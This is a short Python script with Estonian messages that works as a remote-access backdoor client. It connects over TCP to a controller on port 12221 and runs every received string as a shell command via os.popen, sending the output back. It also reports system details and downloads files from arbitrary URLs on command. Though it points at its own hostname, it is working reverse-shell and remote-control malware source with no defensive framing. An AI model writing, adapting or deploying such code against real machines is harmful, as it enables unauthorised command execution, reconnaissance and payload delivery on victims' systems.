import socket
import os
import requests
from platform import *

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = socket.gethostname()
port = 12221

s.connect((host, port))

while True:
    data = s.recv(4096).decode()
    if data == "os":
        s.send("CPU: {}, OS: {} {}, Machine name: {}".format(machine(),system(),release(),node()).encode())
    if data[:5] == "ssend":
        s.send("Saadan faili".encode())
        url = data[6:]
        r = requests.get(url, allow_redirects=True)
        if url.find('/'):
            urlName = url.rsplit('/', 1)[1]
        open(urlName, 'wb').write(r.content)
    output = os.popen(data).read()
    if not output:
        s.send("\n".encode())
    s.send(output.encode())

print("Uhendus katkes")
